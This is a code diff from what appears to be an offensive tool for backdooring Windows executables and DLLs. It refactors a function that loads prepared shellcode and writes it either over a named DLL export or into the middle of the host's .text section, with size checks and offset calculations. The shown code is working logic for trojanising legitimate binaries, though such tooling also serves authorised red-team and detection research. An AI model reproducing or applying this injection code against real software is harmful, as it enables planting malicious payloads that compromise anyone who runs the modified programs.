@@ -33,35 +33,31 @@ def inject_exe(
     # Read prepared loader shellcode
     # And check if it fits into the target code section
     main_shc = file_readall_binary(main_shc_path)
-    l = len(main_shc)
-    if l + 128 > project.exe_host.code_section.Misc_VirtualSize:
-        logger.error("Error: Shellcode {}+128 too small for target code section {}".format(
-            l, project.exe_host.code_section.Misc_VirtualSize
+    shellcode_len = len(main_shc)
+    if shellcode_len + 128 > project.exe_host.code_section.Misc_VirtualSize:
+        raise Exception("Error: Shellcode {}+128 too small for target code section {}".format(
+            shellcode_len, project.exe_host.code_section.Misc_VirtualSize
         ))
-        return False
 
     # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
     superpe = SuperPe(exe_in)
-    function_backdoorer = FunctionBackdoorer(superpe, main_shc)
+    function_backdoorer = FunctionBackdoorer(superpe)
 
-    shellcode_offset: int = 0
+    shellcode_offset: int = 0  # file offset
     if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
         # Special case. put it at the beginning of the exported DLL function
         logger.info("--[ Overwrite DLL function {} with shellcode".format(settings.dllfunc))
         rva = superpe.getExportEntryPoint(settings.dllfunc)
 
         # Size and sanity checks
-        exports = superpe.get_exports_full()
-        for exp in exports:
-            if exp["name"] == settings.dllfunc:
-                if l >= exp["size"]:
-                    raise Exception("Shellcode too large: {} > {} exported function {}".format(
-                        l, exp["size"], settings.dllfunc
-                    ))
-                break
+        function_size = superpe.get_size_of_exported_function(settings.dllfunc)
+        if shellcode_len >= function_size:
+            raise Exception("Shellcode too large: {} > {} exported function {}".format(
+                shellcode_len, function_size, settings.dllfunc
+            ))
 
         # Inject
-        shellcode_offset = superpe.get_physical_address(rva)
+        shellcode_offset = superpe.get_offset_from_rva(rva)
         logger.info(f'---[ Using DLL Export "{settings.dllfunc}" at RVA 0x{rva:X} offset 0x{shellcode_offset:X} to overwrite')
         superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)
 
@@ -69,15 +65,15 @@ def inject_exe(
         sect = superpe.get_code_section()
         if sect == None:
             raise Exception('Could not find code section in input PE file!')
-        sect_name = sect.Name.decode().rstrip('\x00')
         sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
-        if sect_size < l:
+        if sect_size < shellcode_len:
             raise Exception("Shellcode too large: {} > {}".format(
-                l, sect_size
+                shellcode_len, sect_size
             ))
-        shellcode_offset = int((sect_size - l) / 2)
+        shellcode_offset = int((sect_size - shellcode_len) / 2)  # centered in the .text section
+        shellcode_offset += sect.PointerToRawData
         shellcode_rva = superpe.pe.get_rva_from_offset(shellcode_offset)
-        logger.info("--( Inject: Shellcode rva:0x{:X}  offset:0x{:X}".format(
+        logger.info("--( Inject: Shellcode rva:0x{:X} (from offset:0x{:X})".format(
             shellcode_rva, shellcode_offset))
 
         # Copy the shellcode
